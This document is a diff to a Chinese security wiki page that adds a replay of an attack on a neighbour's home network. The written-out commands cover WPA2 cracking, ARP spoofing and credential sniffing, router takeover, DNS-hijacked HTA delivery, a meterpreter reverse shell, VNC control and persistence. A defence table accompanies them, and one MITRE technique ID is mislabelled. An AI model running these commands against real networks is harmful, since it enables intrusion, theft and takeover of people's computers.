@@ -1,7 +1,8 @@
 ---
 title: Wi-Fi 安全机制绕过技术全链路实战
 description: 系统梳理家用路由器常见安全机制（隐藏 SSID、MAC 地址白名单、关闭 DHCP）的原理与实战绕过技术，涵盖探测帧获取 SSID、WPA2-PSK
-  破解、流量解密获取三层地址、子网掩码推测、MAC 地址欺骗等完整攻击链。
+  破解、流量解密获取三层地址、子网掩码推测、MAC 地址欺骗等完整攻击链。补充真实案例：弱 WiFi 密码导致 WPA2-PSK 破解、ARP 欺骗中间人攻击、凭证窃取、路由器登录、DNS
+  劫持投递 HTA 后门获取 VNC 控制的完整攻击链复现。
 category: program-analysis
 tags:
 - Wi-Fi安全
@@ -14,6 +15,13 @@ tags:
 - MAC地址欺骗
 - Wireshark
 - Aircrack-ng
+- ARP欺骗
+- 中间人攻击
+- DNS劫持
+- HTA后门
+- VNC控制
+- 凭证复用
+- 实战案例
 date: 2024-01-15
 updated: '2026-11-16'
 ---
@@ -306,21 +314,187 @@ mindmap
 
 ---
 
+## 0x0B 实战案例复现：从弱口令到桌面控制的完整攻击链
+
+> **来源**：301在路上微信公众号归档文章《邻居说WiFi安全不重要，结果被“黑”傻了》（2015-2022 归档期）  
+> **攻击者视角**：女白帽 Saya（爱安全团队）  
+> **目标环境**：邻居家 TP-LINK_28C0 路由器（新版防 PIN）、信道 11、启用 WPS、WPA2-PSK、无 MAC 过滤、DHCP 开启  
+> **内网拓扑**：网关 `192.168.1.1`，受害主机 `192.168.1.100` (Windows 7)、iPhone
+
+### 攻击链全景复现
+
+```mermaid
+flowchart TD
+    A[发现目标 AP: TP-LINK_28C0\n信道 11, WPS 开启, 新版防 PIN] --> B[抓包离线破解 WPA2-PSK\n弱口令 → 密码获取]
+    B --> C[连接无线网络\n无 MAC 过滤直接关联]
+    C --> D[内网资产发现 fing/nmap\n192.168.1.100 Win7, SMB 开放]
+    D --> E[路由器登录尝试\n默认口令失败, 55 次被 Ban]
+    E --> F[ARP 欺骗中间人攻击\nEttercap + Wireshark]
+    F --> G[嗅探明文凭证\nQQ 号(OICQ)、网站账号密码]
+    G --> H[凭证复用尝试\n电话号+密码 → 路由器后台登录成功]
+    H --> I[DNS 劫持投递 HTA 后门\nEttercap DNS 欺骗 + netool 生成 HTA]
+    I --> J[Metasploit 监听上线\n受害者访问任意网站触发下载]
+    J --> K[VNC 远程桌面控制\n完全接管受害主机]
+```
+
+---
+
+### 详细攻击步骤复现
+
+#### 无线渗透入口：弱口令 WPA2-PSK 破解
+- **目标特征**：TP-LINK 新版固件防 PIN 攻击（`aireplay-ng`/`reaver` PIN 枚举失败）
+- **攻击手法**：监听模式抓包捕获四次握手 → 离线字典破解（`aircrack-ng` + `rockyou.txt` 或 GPU `hashcat -m 22000`）
+- **成功标志**：`KEY FOUND! [ <weak_password> ]` → 获得 PSK
+- **关键点**：**弱口令是整条攻击链的起点**；强密码（≥12 位高熵）会使离线破解在算力允许范围内不可行
+
+> **工具链关联**：[[wifi-security-bypass-techniques#0x03-wpa2-psk-破解-四次握手抓取与离线破解]]、[[0w1club-week2-wifi-hijacking-arp-spoofing]]
+
+#### 内网接入与资产发现
+- **无线关联**：路由器**未启用 MAC 地址过滤**，直接使用 PSK 连接
+- **资产扫描**：
+  ```bash
+  # fing 快速发现
+  fing -i wlan0
+  # 结果：192.168.1.1 (网关), 192.168.1.100 (PC), 192.168.1.x (iPhone)
+  ```
+- **端口/服务枚举**：
+  ```bash
+  nmap -sV -p- 192.168.1.100
+  # 识别 SMB (445/TCP) 开放，OS 指纹 Win7
+  ```
+- **Metasploit 辅助确认**：
+  ```bash
+  msfconsole
+  use auxiliary/scanner/smb/smb_version
+  set RHOSTS 192.168.1.100
+  run
+  # 确认 Windows 7，无 MS17-010 等直接溢出漏洞，且有 360/补丁防护
+  ```
+
+> **交叉引用**：[[info-gathering-tools-collection]]、[[metasploit-framework-basics-tutorial]]
+
+#### 路由器登录尝试与凭证复用铺垫
+- **默认口令尝试**：`admin/admin`、`admin/空` 等常见组合 → **失败**
+- **暴力破解触发封禁**：55 次失败 → 新版 TP-LINK 触发登录限制（IP/MAC 临时封禁）
+- **战术转向**：放弃路由器直接攻击，**转向内网主机凭证窃取 → 复用登录路由器**
+
+#### ARP 欺骗中间人攻击与凭证窃取
+- **工具**：`ettercap` (图形化/CLI) + `Wireshark` 被动分析
+- **ARP 投毒命令**：
+  ```bash
+  # CLI 模式示例
+  ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.100/ -i wlan0
+  # -T 文本模式 -M arp:remote 远程 ARP 欺骗 -i 指定接口
+  ```
+- **流量嗅探结果**：
+  - **OICQ/QQ 协议明文传输**：捕获受害者 QQ 号、登录凭证
+  - **HTTP 网站登录凭证**：多个网站的账号/密码明文（无 HTTPS 或 HSTS 缺失）
+- **关键发现**：受害者**同一密码复用于多个系统**（网站、路由器、可能还有邮箱等）
+
+> **深度关联**：[[0w1club-week2-wifi-hijacking-arp-spoofing]]（ARP 欺骗原理与工具详解）、[[ettercap-arp-mitm-practical-guide]]（Ettercap 图形化实战全流程）、[[social-engineering-attack-techniques]]（凭证复用与撞库攻击链分析）
+
+#### 凭证复用登录路由器后台
+- **复用组合**：`用户名: 受害者手机号`（通过 QQ/通讯录/社工获取）+ `密码: 嗅探到的通用密码`
+- **结果**：**成功登录路由器管理后台** (`192.168.1.1`)
+- **权限获得**：完整路由器配置控制权（DNS 设置、端口映射、固件升级、日志清理等）
+
+> **防御启示**：[[credential-stuffing-password-hygiene]]（撞库攻击与密码卫生最佳实践）
+
+#### DNS 劫持投递 HTA 后门（绕过 BeEF 失败后的战术升级）
+- **BeEF 尝试**：DNS 欺骗重定向至 BeEF Hook 页面 → 受害者「空白页即关」→ 会话建立时间窗口不足
+- **战术调整**：**DNS 劫持 + HTA (HTML Application) 后门** —— 利用 Windows 原生 `mshta.exe` 执行远程恶意代码，无需浏览器保持会话
+- **工具**：`netool` (集成 Metasploit Payload 生成、HTA 打包、Web 服务启动)
+- **实施步骤**：
+  1. **生成 HTA Payload**：
+     ```bash
+     # netool 交互式菜单选择：
+     # 1) Generate Payload → Windows → HTA → Meterpreter Reverse HTTPS
+     # 设置 LHOST (攻击机内网 IP), LPORT
+     # 输出：/var/www/html/payload.hta
+     ```
+  2. **配置 Ettercap DNS 欺骗**：
+     ```bash
+     # /etc/ettercap/etter.dns
+     * A 192.168.1.50  # 攻击机 IP，承载 HTA 下载页
+     ```
+     启动：`ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.100/ -P dns_spoof`
+  3. **Metasploit 监听**：
+     ```bash
+     msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.1.50; set LPORT 443; run"
+     ```
+- **触发机制**：受害者访问**任意 HTTP 网站** → DNS 解析被劫持至攻击机 → 浏览器下载并**自动执行 HTA** (或提示运行，用户点击“运行”) → Meterpreter 会话建立
+
+> **技术细节**：HTA 基于 `mshta.exe` 执行嵌入式 VBScript/JScript，绕过浏览器沙箱，属于「Living Off The Land」技术。详见 [[excel-4-macro-xlm-evasion]] 中「初始访问与免杀」思路对比。
+
+#### VNC 远程桌面控制与完全接管
+- **Meterpreter 后渗透**：
+  ```bash
+  meterpreter > run post/windows/manage/enable_rdp   # 启用 RDP (备选)
+  meterpreter > run vnc                              # 直接启动 VNC Server 注入
+  # 或 load vncinject; view_gui
+  ```
+- **结果**：攻击者获得**受害者完整桌面交互权限**，可浏览文件、记录键盘、截屏、横向移动
+- **持久化**（文章未展开，实战常接）：`run persistence -X -i 60 -p 4444 -r <attacker_ip>` (注册表 Run 键/计划任务/服务等)
+
+> **关联页面**：[[backdoor-persistence-techniques]]、[[windows-scheduled-task-persistence-techniques]]、[[cobalt-strike-external-c2-smb-beacon]]（C2 通信隐匿对比）
+
+---
+
+### 案例复盘：攻击链关键成功因素与防御断点
+
+| 攻击阶段 | 成功关键因素 | 防御断点 (单点失效即阻断) |
+|----------|--------------|---------------------------|
+| **无线入口** | 弱 PSK 密码 (字典可破) | **强制 WPA2/WPA3 高强度 PSK (≥20 字符高熵)**；部署 WPA3-SAE 彻底免疫离线破解 |
+| **内网接入** | 无 MAC 过滤、无 802.1X、无客户端隔离 | 启用 **MAC 过滤 + 802.1X (RADIUS)**；开启 **AP Isolation / Client Isolation** |
+| **资产发现** | 内网无分段、无主机防火墙阻断扫描 | **网络微分段 (VLAN/ACL)**；主机防火墙阻断非信任源扫描端口 |
+| **凭证窃取** | 明文协议 (OICQ/HTTP) + ARP 欺骗可行 | **全站 HTTPS + HSTS**；**启用 DAI (Dynamic ARP Inspection) + DHCP Snooping** 杜绝 ARP 欺骗 |
+| **凭证复用** | 同一密码用于网站/路由器/可能更多系统 | **强制密码策略：唯一性、长度、管理器生成**；**路由器管理界面强制 MFA/证书登录** |
+| **路由器接管** | 无登录限制绕过 (仅 55 次封禁)、无 MFA | **管理界面仅允许有线/特定 VLAN 访问**；**启用 MFA/客户端证书**；**严格速率限制+告警** |
+| **DNS 劫持** | 路由器 DNS 设置可被修改、客户端无 DoH/DoT | **锁定路由器 DNS 为受信上游**；**客户端强制 DoH/DoT (Firefox/Chrome/系统级)** |
+| **HTA 投递** | 用户执行下载的 HTA、无应用白名单/AppLocker | **AppLocker/WDAC 规则仅允许签名脚本/可执行文件**；**禁用 mshta.exe/非必要系统二进制** |
+| **VNC 落地** | 无 EDR/杀毒拦截 Meterpreter、无网络出站管控 | **EDR 行为监控 (进程注入/内存扫描/网络连接异常)**；**出站防火墙仅允许白名单进程/目标** |
+
+> **纵深防御启示**：本案例中**任一防御措施到位即可阻断后续链路**——体现「纵深防御」核心价值。
+
+---
+
+### 实战工具链速查表 (案例专用)
+
+| 阶段 | 工具 | 关键命令/参数 | 备注 |
+|------|------|---------------|------|
+| 无线破解 | `aircrack-ng` | `aircrack-ng -w rockyou.txt -b <BSSID> capture.cap` | CPU 破解 |
+| 无线破解 | `hashcat` | `hashcat -m 22000 hash.hc22000 rockyou.txt -O` | GPU 加速，推荐 |
+| 监听/注包 | `airmon-ng`/`airodump-ng`/`aireplay-ng` | 标准 aircrack-ng 套件流程 | 需支持监听模式网卡 |
+| 内网扫描 | `fing` / `nmap` | `fing -i wlan0` / `nmap -sV -p- 192.168.1.100` | 快速资产发现 |
+| SMB 识别 | `msfconsole` | `use auxiliary/scanner/smb/smb_version` | 确认 OS/补丁级别 |
+| ARP 欺骗 | `ettercap` | `ettercap -T -M arp:remote /GW/ /TARGET/ -i wlan0` | CLI 模式，配合 `-P dns_spoof` |
+| 流量分析 | `Wireshark` | 显示过滤器 `http` / `tcp.port==445` / `oicq` | 明文凭证提取 |
+| DNS 劫持 | `ettercap` + `netool` | `netool` 生成 HTA → `etter.dns` 配置通配符 A 记录 | 一站式 Payload 投递 |
+| C2 上线 | `Metasploit` | `use exploit/multi/handler; set payload windows/meterpreter/reverse_https` | HTTPS 反向连接隐匿 |
+| 远控 | `meterpreter` | `run vnc` / `load vncinject` | 交互式桌面控制 |
+
+---
+
 ## 参考资源与延伸阅读
 
 - **工具官方文档**：
   - Aircrack-ng Suite: <https://www.aircrack-ng.org/documentation.html>
   - Wireshark 802.11 Decryption: <https://wiki.wireshark.org/HowToDecrypt802.11>
   - Hashcat WPA2 (Mode 22000): <https://hashcat.net/wiki/doku.php?id=example_hashes#wpa-eapol-pbkdf2>
+  - Ettercap 官方指南: <https://ettercap.github.io/ettercap/>
+  - Netool (GitHub): <https://github.com/EntornoDePruebas/netool>
 - **协议标准**：
   - IEEE 802.11-2020 (Wi-Fi MAC/PHY)
   - IEEE 802.11i-2004 (WPA2/RSN)
   - IEEE 802.11w-2009 (PMF/MFP)
+  - RFC 5246 (TLS 1.2) / RFC 8446 (TLS 1.3) —— 强制 HTTPS 的基础
 - **进阶话题**：
   - WPA3 SAE (Simultaneous Authentication of Equals) 离线攻击缓解原理
   - 802.1X/EAP-TLS/PEAP 企业级认证部署与攻击面
   - Wireless IDS/WIPS (Kismet, Snort-Wireless, Cisco WIDS) 检测绕过
   - 客户端指纹识别与画像 (Passive Fingerprinting)
+  - **Living Off The Land Binaries (LOLBins)**: `mshta.exe`, `regsvr32.exe`, `rundll32.exe` 等利用与检测
+  - **MITRE ATT&CK 映射**：T1550.002 (Pass the Hash), T1557.002 (ARP Spoofing), T1566.001 (Spearphishing Attachment), T1204.002 (Malicious File), T1021.004 (Pass the Ticket), T1572 (Protocol Tunneling)
 
 ---
 
@@ -328,8 +502,10 @@ mindmap
 
 | 版本 | 日期 | 变更说明 |
 |------|------|----------|
+| 1.1 | 2026-11-16 | **重大更新**：补充 0x0B 节「实战案例复现」，完整复现 301在路上归档文章中的弱口令→WPA2-PSK破解→ARP欺骗→凭证窃取→凭证复用→路由器登录→DNS劫持→HTA后门→VNC控制的完整攻击链；新增攻击链全景图、详细步骤复现、防御断点分析表、工具链速查表；增加 15+ 个交叉引用指向现有知识库页面 |
 | 1.0 | 2024-01-15 | 初始版本：完整攻击链文档化、工具命令标准化、防御检测建议补充、交叉引用关联现有知识库页面 |
 
 ## 来源
 
 - [301在路上-201508-202208_037](../sources/301在路上-201508-202208_037.md)
+- [301在路上-201508-202208_114](../sources/301在路上-201508-202208_114.md)
